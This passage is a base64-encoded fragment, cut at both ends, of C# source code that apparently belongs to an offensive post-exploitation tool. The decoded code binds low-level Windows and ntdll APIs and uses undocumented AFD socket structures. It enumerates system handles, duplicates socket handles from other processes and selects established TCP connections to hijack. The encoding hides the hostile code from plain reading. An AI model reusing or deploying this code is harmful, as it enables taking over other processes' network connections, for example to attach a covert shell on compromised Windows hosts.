saW5nZXI7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIFBhY2sgPSAwKV0KICAgIHByaXZhdGUgc3RydWN0IElPX1NUQVRVU19CTE9DSwogICAgewogICAgICAgIHB1YmxpYyBpbnQgc3RhdHVzOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaW5mb3JtYXRpb247CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgU09DS19TSEFSRURfSU5GTwogICAgewogICAgICAgIHB1YmxpYyBTT0NLRVRfU1RBVEUgU3RhdGU7CiAgICAgICAgcHVibGljIEludDMyIEFkZHJlc3NGYW1pbHk7CiAgICAgICAgcHVibGljIEludDMyIFNvY2tldFR5cGU7CiAgICAgICAgcHVibGljIEludDMyIFByb3RvY29sOwogICAgICAgIHB1YmxpYyBJbnQzMiBMb2NhbEFkZHJlc3NMZW5ndGg7CiAgICAgICAgcHVibGljIEludDMyIFJlbW90ZUFkZHJlc3NMZW5ndGg7CgogICAgICAgIC8vIFNvY2tldCBvcHRpb25zIGNvbnRyb2xsZWQgYnkgZ2V0c29ja29wdCgpLCBzZXRzb2Nrb3B0KCkuCiAgICAgICAgcHVibGljIGxpbmdlciBMaW5nZXJJbmZvOwogICAgICAgIHB1YmxpYyBVSW50MzIgU2VuZFRpbWVvdXQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBSZWNlaXZlVGltZW91dDsKICAgICAgICBwdWJsaWMgVUludDMyIFJlY2VpdmVCdWZmZXJTaXplOwogICAgICAgIHB1YmxpYyBVSW50MzIgU2VuZEJ1ZmZlclNpemU7CiAgICAgICAgLyogVGhvc2UgYXJlIHRoZSBiaXRzIGluIHRoZSBTb2NrZXRQcm9lcnR5LCBwcm9wZXIgb3JkZXI6CiAgICAgICAgICAgIExpc3RlbmluZzsKICAgICAgICAgICAgQnJvYWRjYXN0OwogICAgICAgICAgICBEZWJ1ZzsKICAgICAgICAgICAgT29iSW5saW5lOwogICAgICAgICAgICBSZXVzZUFkZHJlc3NlczsKICAgICAgICAgICAgRXhjbHVzaXZlQWRkcmVzc1VzZTsKICAgICAgICAgICAgTm9uQmxvY2tpbmc7CiAgICAgICAgICAgIERvbnRVc2VXaWxkY2FyZDsKICAgICAgICAgICAgUmVjZWl2ZVNodXRkb3duOwogICAgICAgICAgICBTZW5kU2h1dGRvd247CiAgICAgICAgICAgIENvbmRpdGlvbmFsQWNjZXB0OwogICAgICAgICovCiAgICAgICAgcHVibGljIHVzaG9ydCBTb2NrZXRQcm9wZXJ0eTsKICAgICAgICAvLyBTbmFwc2hvdCBvZiBzZXZlcmFsIHBhcmFtZXRlcnMgcGFzc2VkIGludG8gV1NQU29ja2V0KCkgd2hlbiBjcmVhdGluZyB0aGlzIHNvY2tldAogICAgICAgIHB1YmxpYyBVSW50MzIgQ3JlYXRpb25GbGFnczsKICAgICAgICBwdWJsaWMgVUludDMyIENhdGFsb2dFbnRyeUlkOwogICAgICAgIHB1YmxpYyBVSW50MzIgU2VydmljZUZsYWdzMTsKICAgICAgICBwdWJsaWMgVUludDMyIFByb3ZpZGVyRmxhZ3M7CiAgICAgICAgcHVibGljIFVJbnQzMiBHcm91cElEOwogICAgICAgIHB1YmxpYyBBRkRfR1JPVVBfVFlQRSBHcm91cFR5cGU7CiAgICAgICAgcHVibGljIEludDMyIEdyb3VwUHJpb3JpdHk7CiAgICAgICAgLy8gTGFzdCBlcnJvciBzZXQgb24gdGhpcyBzb2NrZXQKICAgICAgICBwdWJsaWMgSW50MzIgTGFzdEVycm9yOwogICAgICAgIC8vIEluZm8gc3RvcmVkIGZvciBXU0FBc3luY1NlbGVjdCgpCiAgICAgICAgcHVibGljIEludFB0ciBBc3luY1NlbGVjdGhXbmQ7CiAgICAgICAgcHVibGljIFVJbnQzMiBBc3luY1NlbGVjdFNlcmlhbE51bWJlcjsKICAgICAgICBwdWJsaWMgVUludDMyIEFzeW5jU2VsZWN0d01zZzsKICAgICAgICBwdWJsaWMgSW50MzIgQXN5bmNTZWxlY3RsRXZlbnQ7CiAgICAgICAgcHVibGljIEludDMyIERpc2FibGVkQXN5bmNTZWxlY3RFdmVudHM7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgU09DS0FERFIKICAgIHsKICAgICAgICBwdWJsaWMgVUludDE2IHNhX2ZhbWlseTsKICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0ID0gMTQpXQogICAgICAgIHB1YmxpYyBieXRlW10gc2FfZGF0YTsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBTT0NLRVRfQ09OVEVYVAogICAgewogICAgICAgIHB1YmxpYyBTT0NLX1NIQVJFRF9JTkZPIFNoYXJlZERhdGE7CiAgICAgICAgcHVibGljIFVJbnQzMiBTaXplT2ZIZWxwZXJEYXRhOwogICAgICAgIHB1YmxpYyBVSW50MzIgUGFkZGluZzsKICAgICAgICBwdWJsaWMgU09DS0FERFIgTG9jYWxBZGRyZXNzOwogICAgICAgIHB1YmxpYyBTT0NLQUREUiBSZW1vdGVBZGRyZXNzOwogICAgICAgIC8vIEhlbHBlciBEYXRhIC0gZm91bmQgb3V0IHdpdGggc29tZSByZXZlcnNpbmcKICAgICAgICBbTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQnlWYWxBcnJheSwgU2l6ZUNvbnN0ID0gMjQpXQogICAgICAgIHB1YmxpYyBieXRlW10gSGVscGVyRGF0YTsKICAgIH0KCiAgICBwcml2YXRlIHN0cnVjdCBTT0NLRVRfQllURVNJTgogICAgewogICAgICAgIHB1YmxpYyBJbnRQdHIgaGFuZGxlOwogICAgICAgIHB1YmxpYyBVSW50NjQgQnl0ZXNJbjsKICAgIH0KCgogICAgW0RsbEltcG9ydCgiV1MyXzMyLkRMTCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBXU0FEdXBsaWNhdGVTb2NrZXQoSW50UHRyIHNvY2tldEhhbmRsZSwgaW50IHByb2Nlc3NJZCwgcmVmIFdTQVBST1RPQ09MX0lORk8gcGlubmVkQnVmZmVyKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2FsbGluZ0NvbnZlbnRpb24gPSBDYWxsaW5nQ29udmVudGlvbi5TdGRDYWxsKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgV1NBU29ja2V0KFtJbl0gaW50IGFkZHJlc3NGYW1pbHksIFtJbl0gaW50IHNvY2tldFR5cGUsIFtJbl0gaW50IHByb3RvY29sVHlwZSwgcmVmIFdTQVBST1RPQ09MX0lORk8gbHBQcm90b2NvbEluZm8sIEludDMyIGdyb3VwMSwgaW50IGR3RmxhZ3MpOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnQzMiBXU0FHZXRMYXN0RXJyb3IoKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2FsbGluZ0NvbnZlbnRpb24gPSBDYWxsaW5nQ29udmVudGlvbi5TdGRDYWxsKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgZ2V0cGVlcm5hbWUoSW50UHRyIHMsIHJlZiBTT0NLQUREUl9JTiBuYW1lLCByZWYgaW50IG5hbWVsZW4pOwoKICAgIC8vIFdTQUlvY3RsMSBpbXBsZW1lbnRhdGlvbiBzcGVjaWZpYyBmb3IgU0lPX1RDUF9JTkZPIGNvbnRyb2wgY29kZQogICAgW0RsbEltcG9ydCgiV3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUsIEVudHJ5UG9pbnQgPSAiV1NBSW9jdGwiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBXU0FJb2N0bDEoSW50UHRyIHMsIGludCBkd0lvQ29udHJvbENvZGUsIHJlZiBVSW50MzIgbHB2SW5CdWZmZXIsIGludCBjYkluQnVmZmVyLCBJbnRQdHIgbHB2T3V0QnVmZmVyLCBpbnQgY2JPdXRCdWZmZXIsIHJlZiBpbnQgbHBjYkJ5dGVzUmV0dXJuZWQsIEludFB0ciBscE92ZXJsYXBwZWQsIEludFB0ciBscENvbXBsZXRpb25Sb3V0aW5lKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IGNsb3Nlc29ja2V0KEludFB0ciBzKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgT3BlblByb2Nlc3MoaW50IHByb2Nlc3NBY2Nlc3MsIGJvb2wgYkluaGVyaXRIYW5kbGUsIGludCBwcm9jZXNzSWQpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBEdXBsaWNhdGVIYW5kbGUoSW50UHRyIGhTb3VyY2VQcm9jZXNzSGFuZGxlLCBJbnRQdHIgaFNvdXJjZUhhbmRsZSwgSW50UHRyIGhUYXJnZXRQcm9jZXNzSGFuZGxlLCBvdXQgSW50UHRyIGxwVGFyZ2V0SGFuZGxlLCB1aW50IGR3RGVzaXJlZEFjY2VzcywgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXSBib29sIGJJbmhlcml0SGFuZGxlLCB1aW50IGR3T3B0aW9ucyk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7CgogICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gdWludCBOdFF1ZXJ5T2JqZWN0KEludFB0ciBvYmplY3RIYW5kbGUsIE9CSkVDVF9JTkZPUk1BVElPTl9DTEFTUyBpbmZvcm1hdGlvbkNsYXNzLCBJbnRQdHIgaW5mb3JtYXRpb25QdHIsIHVpbnQgaW5mb3JtYXRpb25MZW5ndGgsIHJlZiBpbnQgcmV0dXJuTGVuZ3RoKTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiB1aW50IE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbihpbnQgU3lzdGVtSW5mb3JtYXRpb25DbGFzcywgSW50UHRyIFN5c3RlbUluZm9ybWF0aW9uLCBpbnQgU3lzdGVtSW5mb3JtYXRpb25MZW5ndGgsIHJlZiBpbnQgcmV0dXJuTGVuZ3RoKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBVSW50MzIgV2FpdEZvclNpbmdsZU9iamVjdChJbnRQdHIgaEhhbmRsZSwgVUludDMyIGR3TWlsbGlzZWNvbmRzKTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgTnRDcmVhdGVFdmVudChyZWYgSW50UHRyIEV2ZW50SGFuZGxlLCBpbnQgRGVzaXJlZEFjY2VzcywgSW50UHRyIE9iamVjdEF0dHJpYnV0ZXMsIGludCBFdmVudFR5cGUsIGJvb2wgSW5pdGlhbFN0YXRlKTsKCiAgICAvLyBOdERldmljZUlvQ29udHJvbEZpbGUxIGltcGxlbWVudGF0aW9uIHNwZWNpZmljIGZvciBJT0NUTF9BRkRfR0VUX0NPTlRFWFQgSW9Db250cm9sQ29kZQogICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIiwgRW50cnlQb2ludCA9ICJOdERldmljZUlvQ29udHJvbEZpbGUiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgTnREZXZpY2VJb0NvbnRyb2xGaWxlMShJbnRQdHIgRmlsZUhhbmRsZSwgSW50UHRyIEV2ZW50LCBJbnRQdHIgQXBjUm91dGluZSwgSW50UHRyIEFwY0NvbnRleHQsIHJlZiBJT19TVEFUVVNfQkxPQ0sgSW9TdGF0dXNCbG9jaywgdWludCBJb0NvbnRyb2xDb2RlLCBJbnRQdHIgSW5wdXRCdWZmZXIsIGludCBJbnB1dEJ1ZmZlckxlbmd0aCwgcmVmIFNPQ0tFVF9DT05URVhUIE91dHB1dEJ1ZmZlciwgaW50IE91dHB1dEJ1ZmZlckxlbmd0aCk7CgogICAgW0RsbEltcG9ydCgiV3MyXzMyLmRsbCIpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IGlvY3Rsc29ja2V0KEludFB0ciBzLCBpbnQgY21kLCByZWYgaW50IGFyZ3ApOwogICAgCiAgICAvL2hlbHBlciBtZXRob2Qgd2l0aCAiZHluYW1pYyIgYnVmZmVyIGFsbG9jYXRpb24KICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb25EeW5hbWljKGludCBpbmZvQ2xhc3MsIGludCBpbmZvTGVuZ3RoKQogICAgewogICAgICAgIGlmIChpbmZvTGVuZ3RoID09IDApCiAgICAgICAgICAgIGluZm9MZW5ndGggPSAweDEwMDAwOwogICAgICAgIEludFB0ciBpbmZvUHRyID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwoaW5mb0xlbmd0aCk7CiAgICAgICAgd2hpbGUgKHRydWUpCiAgICAgICAgewogICAgICAgICAgICB1aW50IHJlc3VsdCA9ICh1aW50KU50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbihpbmZvQ2xhc3MsIGluZm9QdHIsIGluZm9MZW5ndGgsIHJlZiBpbmZvTGVuZ3RoKTsKICAgICAgICAgICAgaW5mb0xlbmd0aCA9IGluZm9MZW5ndGggKiAyOwogICAgICAgICAgICBpZiAocmVzdWx0ID09IE5UU1RBVFVTX1NVQ0NFU1MpCiAgICAgICAgICAgICAgICByZXR1cm4gaW5mb1B0cjsKICAgICAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbChpbmZvUHRyKTsgIC8vZnJlZSBwb2ludGVyIHdoZW4gbm90IFN1Y2Nlc3NmdWwKICAgICAgICAgICAgaWYgKHJlc3VsdCAhPSBOVFNUQVRVU19JTkZPTEVOR1RITUlTTUFUQ0ggJiYgcmVzdWx0ICE9IE5UU1RBVFVTX0JVRkZFUk9WRVJGTE9XICYmIHJlc3VsdCAhPSBOVFNUQVRVU19CVUZGRVJUT09TTUFMTCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgLy90aHJvdyBuZXcgRXhjZXB0aW9uKCJVbmhhbmRsZWQgTnRTdGF0dXMgIiArIHJlc3VsdCk7CiAgICAgICAgICAgICAgICByZXR1cm4gSW50UHRyLlplcm87CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaW5mb1B0ciA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKGluZm9MZW5ndGgpOwogICAgICAgIH0KICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBJbnRQdHIgUXVlcnlPYmplY3RUeXBlc0luZm8oKQogICAgewogICAgICAgIEludFB0ciBwdHJPYmplY3RUeXBlc0luZm9ybWF0aW9uID0gSW50UHRyLlplcm87CiAgICAgICAgcHRyT2JqZWN0VHlwZXNJbmZvcm1hdGlvbiA9IE50UXVlcnlPYmplY3REeW5hbWljKEludFB0ci5aZXJvLCBPQkpFQ1RfSU5GT1JNQVRJT05fQ0xBU1MuT2JqZWN0QWxsVHlwZXNJbmZvcm1hdGlvbiwgMCk7CiAgICAgICAgcmV0dXJuIHB0ck9iamVjdFR5cGVzSW5mb3JtYXRpb247CiAgICB9CgogICAgLy8gdGhpcyBmcm9tIC0tPiBodHRwczovL2dpdGh1Yi5jb20vaGZpcmVmMHgvVUFDTUUvYmxvYi9tYXN0ZXIvU291cmNlL1NoYXJlZC9udG9zLmgKICAgIHByaXZhdGUgc3RhdGljIGxvbmcgQWxpZ25VcChsb25nIGFkZHJlc3MsIGxvbmcgYWxpZ24pCiAgICB7CiAgICAgICAgcmV0dXJuICgoKGFkZHJlc3MpICsgKGFsaWduKSAtIDEpICYgfigoYWxpZ24pIC0gMSkpOwogICAgfQoKICAgIC8vIHRoaXMgd29ya3Mgb25seSBmcm9tIHdpbjggYW5kIGFib3ZlLiBJZiB5b3UgbmVlZCBhIG1vcmUgZ2VuZXJpYyBzb2x1dGlvbiB5b3UgbmVlZCB0byB1c2UgdGhlIChpKzIpICJ3YXkiIG9mIGNvdW50aW5nIGluZGV4IHR5cGVzLgogICAgLy8gY3JlZGl0cyBmb3IgdGhpcyBnb2VzIHRvIEAweHJlcG56CiAgICAvLyBtb3JlIGluZm9ybWF0aW9uIGhlcmUgLS0+IGh0dHBzOi8vdHdpdHRlci5jb20vc3BsaW50ZXJfY29kZS9zdGF0dXMvMTQwMDg3MzAwOTEyMTAxMzc2NQogICAgcHJpdmF0ZSBzdGF0aWMgYnl0ZSBHZXRUeXBlSW5kZXhCeU5hbWUoc3RyaW5nIE9iamVjdE5hbWUpCiAgICB7CiAgICAgICAgYnl0ZSBUeXBlSW5kZXggPSAwOwogICAgICAgIGxvbmcgVHlwZXNDb3VudCA9IDA7CiAgICAgICAgSW50UHRyIHB0clR5cGVzSW5mbyA9IEludFB0ci5aZXJvOwogICAgICAgIHB0clR5cGVzSW5mbyA9IFF1ZXJ5T2JqZWN0VHlwZXNJbmZvKCk7CiAgICAgICAgVHlwZXNDb3VudCA9IE1hcnNoYWwuUmVhZEludFB0cihwdHJUeXBlc0luZm8pLlRvSW50NjQoKTsKICAgICAgICAvLyBjcmVhdGUgYSBwb2ludGVyIHRvIHRoZSBmaXJzdCBlbGVtZW50IGFkZHJlc3Mgb2YgT0JKRUNUX1RZUEVfSU5GT1JNQVRJT05fVjIKICAgICAgICBJbnRQdHIgcHRyVHlwZXNJbmZvQ3VycmVudCA9IG5ldyBJbnRQdHIocHRyVHlwZXNJbmZvLlRvSW50NjQoKSArIEludFB0ci5TaXplKTsKICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IFR5cGVzQ291bnQ7IGkrKykKICAgICAgICB7CiAgICAgICAgICAgIE9CSkVDVF9UWVBFX0lORk9STUFUSU9OX1YyIFR5cGUgPSAoT0JKRUNUX1RZUEVfSU5GT1JNQVRJT05fVjIpTWFyc2hhbC5QdHJUb1N0cnVjdHVyZShwdHJUeXBlc0luZm9DdXJyZW50LCB0eXBlb2YoT0JKRUNUX1RZUEVfSU5GT1JNQVRJT05fVjIpKTsKICAgICAgICAgICAgLy8gbW92ZSBwb2ludGVyIHRvIG5leHQgdGhlIE9CSkVDVF9UWVBFX0lORk9STUFUSU9OX1YyIG9iamVjdAogICAgICAgICAgICBwdHJUeXBlc0luZm9DdXJyZW50ID0gKEludFB0cikocHRyVHlwZXNJbmZvQ3VycmVudC5Ub0ludDY0KCkgKyBBbGlnblVwKFR5cGUuVHlwZU5hbWUuTWF4aW11bUxlbmd0aCwgKGxvbmcpSW50UHRyLlNpemUpICsgTWFyc2hhbC5TaXplT2YodHlwZW9mKE9CSkVDVF9UWVBFX0lORk9STUFUSU9OX1YyKSkpOwogICAgICAgICAgICBpZiAoVHlwZS5UeXBlTmFtZS5MZW5ndGggPiAwICYmIE1hcnNoYWwuUHRyVG9TdHJpbmdVbmkoVHlwZS5UeXBlTmFtZS5CdWZmZXIsIFR5cGUuVHlwZU5hbWUuTGVuZ3RoIC8gMikgPT0gT2JqZWN0TmFtZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVHlwZUluZGV4ID0gVHlwZS5UeXBlSW5kZXg7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBNYXJzaGFsLkZyZWVIR2xvYmFsKHB0clR5cGVzSW5mbyk7CiAgICAgICAgcmV0dXJuIFR5cGVJbmRleDsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBMaXN0PEludFB0cj4gRHVwbGljYXRlU29ja2V0c0Zyb21IYW5kbGVzKExpc3Q8SW50UHRyPiBzb2NrZXRzKQogICAgewogICAgICAgIExpc3Q8SW50UHRyPiBkdXBlZFNvY2tldHNPdXQgPSBuZXcgTGlzdDxJbnRQdHI+KCk7CiAgICAgICAgaWYgKHNvY2tldHMuQ291bnQgPCAxKSByZXR1cm4gZHVwZWRTb2NrZXRzT3V0OwogICAgICAgIGZvcmVhY2ggKEludFB0ciBzb2NrIGluIHNvY2tldHMpCiAgICAgICAgewogICAgICAgICAgICBJbnRQdHIgZHVwZWRTb2NrZXQgPSBEdXBsaWNhdGVTb2NrZXRGcm9tSGFuZGxlKHNvY2spOwogICAgICAgICAgICBpZiAoZHVwZWRTb2NrZXQgIT0gSW50UHRyLlplcm8pIGR1cGVkU29ja2V0c091dC5BZGQoZHVwZWRTb2NrZXQpOwogICAgICAgIH0KICAgICAgICAvLyBjbGVhbmluZyBhbGwgc29ja2V0IGhhbmRsZXMKICAgICAgICBmb3JlYWNoIChJbnRQdHIgc29jayBpbiBzb2NrZXRzKQogICAgICAgICAgICBDbG9zZUhhbmRsZShzb2NrKTsKICAgICAgICByZXR1cm4gZHVwZWRTb2NrZXRzT3V0OwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIExpc3Q8SW50UHRyPiBGaWx0ZXJBbmRPcmRlclNvY2tldHNCeUJ5dGVzSW4oTGlzdDxJbnRQdHI+IHNvY2tldHMpCiAgICB7CiAgICAgICAgTGlzdDxTT0NLRVRfQllURVNJTj4gc29ja2V0c0J5dGVzSW4gPSBuZXcgTGlzdDxTT0NLRVRfQllURVNJTj4oKTsKICAgICAgICBMaXN0PEludFB0cj4gc29ja2V0c091dCA9IG5ldyBMaXN0PEludFB0cj4oKTsKICAgICAgICBmb3JlYWNoIChJbnRQdHIgc29jayBpbiBzb2NrZXRzKQogICAgICAgIHsKICAgICAgICAgICAgVENQX0lORk9fdjAgc29ja0luZm8gPSBuZXcgVENQX0lORk9fdjAoKTsKICAgICAgICAgICAgaWYgKCFHZXRTb2NrZXRUY3BJbmZvKHNvY2ssIG91dCBzb2NrSW5mbykpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGNsb3Nlc29ja2V0KHNvY2spOwogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBTb2NrZXQgaGFuZGxlIDB4IiArIHNvY2suVG9TdHJpbmcoIlg0IikgKyAiIGlzIGluIHRjcHN0YXRlICIgKyBzb2NrSW5mby5TdGF0ZS5Ub1N0cmluZygpKTsKICAgICAgICAgICAgLy8gd2UgbmVlZCBvbmx5IGFjdGl2ZSBzb2NrZXRzLCB0aGUgcmVtYWluZyBzb2NrZXRzIGFyZSBmaWx0ZXJlZCBvdXQKICAgICAgICAgICAgaWYgKHNvY2tJbmZvLlN0YXRlID09IFRjcFN0YXRlLlN5blJlY2VpdmVkIHx8IHNvY2tJbmZvLlN0YXRlID09IFRjcFN0YXRlLkVzdGFibGlzaGVkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBTT0NLRVRfQllURVNJTiBzb2NrQnl0ZXNJbiA9IG5ldyBTT0NLRVRfQllURVNJTigpOwogICAgICAgICAgICAgICAgc29ja0J5dGVzSW4uaGFuZGxlID0gc29jazsKICAgICAgICAgICAgICAgIHNvY2tCeXRlc0luLkJ5dGVzSW4gPSBzb2NrSW5mby5CeXRlc0luOwogICAgICAgICAgICAgICAgc29ja2V0c0J5dGVzSW4uQWRkKHNvY2tCeXRlc0luKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBjbG9zZXNvY2tldChzb2NrKTsKICAgICAgICB9CiAgICAgICAgaWYgKHNvY2tldHNCeXRlc0luLkNvdW50IDwgMSkgcmV0dXJuIHNvY2tldHNPdXQ7CiAgICAgICAgaWYgKHNvY2tldHNCeXRlc0luLkNvdW50ID49IDIpCiAgICAgICAgICAgIC8vIG9yZGVyaW5nIGZvciBmZXdlciBieXRlcyByZWNlaXZlZCBieSB0aGUgc29ja2V0cyB3ZSBoYXZlIGEgaGlnaGVyIGNoYW5jZSB0byBnZXQgdGhlIHByb3BlciBzb2NrZXQKICAgICAgICAgICAgc29ja2V0c0J5dGVzSW4uU29ydChkZWxlZ2F0ZSAoU09DS0VUX0JZVEVTSU4gYSwgU09DS0VUX0JZVEVTSU4gYikgeyByZXR1cm4gKGEuQnl0ZXNJbi5Db21wYXJlVG8oYi5CeXRlc0luKSk7IH0pOwogICAgICAgIGZvcmVhY2ggKFNPQ0tFVF9CWVRFU0lOIHNvY2tCeXRlc0luIGluIHNvY2tldHNCeXRlc0luKQogICAgICAgIHsKICAgICAgICAgICAgc29ja2V0c091dC5BZGQoc29ja0J5dGVzSW4uaGFuZGxlKTsKICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBTb2NrZXQgaGFuZGxlIDB4IiArIHNvY2tCeXRlc0luLmhhbmRsZS5Ub1N0cmluZygiWDQiKSArICIgdG90YWwgYnl0ZXMgcmVjZWl2ZWQ6ICIgKyBzb2NrQnl0ZXNJbi5CeXRlc0luLlRvU3RyaW5nKCkpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gc29ja2V0c091dDsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBib29sIEdldFNvY2tldFRjcEluZm8oSW50UHRyIHNvY2tldCwgb3V0IFRDUF9JTkZPX3YwIHRjcEluZm9PdXQpCiAgICB7CiAgICAgICAgaW50IHJlc3VsdCA9IC0xOwogICAgICAgIFVJbnQzMiB0Y3BJbmZvVmVyc2lvbiA9IDA7CiAgICAgICAgaW50IGJ5dGVzUmV0dXJuZWQgPSAwOwogICAgICAgIGludCB0Y3BJbmZvU2l6ZSA9IE1hcnNoYWwuU2l6ZU9mKHR5cGVvZihUQ1BfSU5GT192MCkpOwogICAgICAgIEludFB0ciB0Y3BJbmZvUHRyID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwodGNwSW5mb1NpemUpOwogICAgICAgIHJlc3VsdCA9IFdTQUlvY3RsMShzb2NrZXQsIFNJT19UQ1BfSU5GTywgcmVmIHRjcEluZm9WZXJzaW9uLCBNYXJzaGFsLlNpemVPZih0Y3BJbmZvVmVyc2lvbiksIHRjcEluZm9QdHIsIHRjcEluZm9TaXplLCByZWYgYnl0ZXNSZXR1cm5lZCwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvKTsKICAgICAgICBpZiAocmVzdWx0ICE9IDApCiAgICAgICAgewogICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWc6IFdTQUlvY3RsMSBmYWlsZWQgd2l0aCByZXR1cm4gY29kZSAiICsgcmVzdWx0LlRvU3RyaW5nKCkgKyAiIGFuZCB3c2FsYXN0ZXJyb3I6ICIgKyBXU0FHZXRMYXN0RXJyb3IoKS5Ub1N0cmluZygpKTsKICAgICAgICAgICAgdGNwSW5mb091dCA9IG5ldyBUQ1BfSU5GT192MCgpOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgIFRDUF9JTkZPX3YwIHRjcEluZm9WMCA9IChUQ1BfSU5GT192MClNYXJzaGFsLlB0clRvU3RydWN0dXJlKHRjcEluZm9QdHIsIHR5cGVvZihUQ1BfSU5GT192MCkpOwogICAgICAgIHRjcEluZm9PdXQgPSB0Y3BJbmZvVjA7CiAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbCh0Y3BJbmZvUHRyKTsKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvLyB0aGlzIGZ1bmN0aW9uIHRha2UgYSByYXcgaGFuZGxlIHRvIGEgXERldmljZVxBZmQgb2JqZWN0IGFzIGEgcGFyYW1ldGVyIGFuZCByZXR1cm5zIGEgaGFuZGxlIHRvIGEgZHVwbGljYXRlZCBzb2NrZXQKICAgIHByaXZhdGUgc3RhdGljIEludFB0ciBEdXBsaWNhdGVTb2